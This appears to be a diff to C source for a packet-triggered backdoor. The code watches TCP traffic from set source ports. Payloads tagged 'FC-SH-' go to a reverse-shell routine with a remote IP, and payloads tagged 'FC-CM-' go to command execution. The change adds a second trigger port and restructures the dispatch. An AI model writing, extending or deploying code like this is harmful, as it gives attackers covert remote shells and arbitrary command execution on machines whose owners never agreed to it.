@@ -1,7 +1,5 @@
 #include "femtocell.h"
 
-
-
 int main(int argc, char** argv) 
 {
 	if (argc != 3) 
@@ -61,7 +59,7 @@ int main(int argc, char** argv)
 		{
 			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
 			uint16_t sport = ntohs(tcp_header->th_sport);
-			if (sport == SRC_PORT)
+			if (sport == SRC_PORT || sport == SRC_PORT_2)
 			{
 				uint16_t flag = (uint16_t)tcp_header->th_flags;
 				BOOL push = (flag >> 3) % 2;
@@ -72,15 +70,18 @@ int main(int argc, char** argv)
 					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
 					data[payloadLength - 1] = '\0';
 
-					if (payloadLength > 6 && strncmp(data, "FC-SH-", 6) == 0)
+					if (payloadLength > 6)
 					{
-						char* rip = (char*)data + 6;
-						rev(rip);
-					}
-					else if (payloadLength > 6 && strncmp(data, "FC-CM-", 6) == 0)
-					{
-						char* cmd = (char*)data + 6;
-						exec(cmd);
+						if (strncmp(data, "FC-SH-", 6) == 0)
+						{
+							char* rip = (char*)data + 6;
+							rev(rip);
+						}
+						else if (strncmp(data, "FC-CM-", 6) == 0)
+						{
+							char* cmd = (char*)data + 6;
+							exec(cmd);
+						}
 					}
 				}
 			}
